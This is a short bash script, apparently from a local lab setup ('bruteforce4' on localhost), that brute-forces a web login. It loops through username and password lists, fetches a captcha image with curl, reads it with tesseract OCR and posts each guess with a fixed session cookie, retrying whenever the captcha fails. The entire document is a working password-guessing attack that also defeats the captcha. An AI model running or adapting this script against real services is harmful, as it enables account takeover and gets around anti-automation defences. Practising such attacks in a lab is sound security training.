#!/bin/bash

USERS="./users.txt"
PASSWORDS="./passwords.txt"

for USER in $(cat $USERS)
do
	for PASS in $(cat $PASSWORDS)
	do
		
		STATUS="Captcha incorreto"
		
		while [ "$STATUS" == "Captcha incorreto" ]
		do

			curl -s "http://localhost/bruteforce4/captcha.php?l=150&a=50&tf=20&ql=5" -H 'Cookie: PHPSESSID=r8n9p20c0jtf8dob9ef787sqn7' --output image

			CAPTCHA=$(tesseract image stdout | tr -d " " | xargs)

			STATUS=$(curl -s 'http://localhost/bruteforce4/index.php' -H 'Cookie: PHPSESSID=r8n9p20c0jtf8dob9ef787sqn7' --data-raw "username=$USER&password=$PASS&captcha=$CAPTCHA" -L | egrep -o "<p style=\"color:red\" >.*</p>" | sed -r "s/.*>(.*)<.*/\1/g")
				
			if [ "$STATUS" == "" ]
			then		
				COLOR='\033[0;32m'
				NC='\033[0m' # No Color				
				STATUS="Sucesso"
				
			elif [ "$STATUS" == "Captcha incorreto" ]
			then
				COLOR='\033[0;33m'
				NC='\033[0m' # No Color
			else
				COLOR='\033[0;31m' 				
			fi
			
			echo -e "${COLOR}User: $USER - Pass: $PASS - Status: $STATUS${NC}"	
		done	
	
	done
done




